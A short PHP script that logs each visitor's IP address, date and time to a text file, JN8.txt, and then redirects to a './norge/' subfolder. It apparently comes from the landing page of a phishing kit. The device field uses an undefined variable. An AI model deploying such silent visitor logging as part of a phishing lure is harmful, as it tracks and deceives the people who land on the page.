<?php 
	$ip = getenv("REMOTE_ADDR");
	$file = fopen("JN8.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/DEVICE=".$user_os."\n");
header("Location: ./norge/");
?>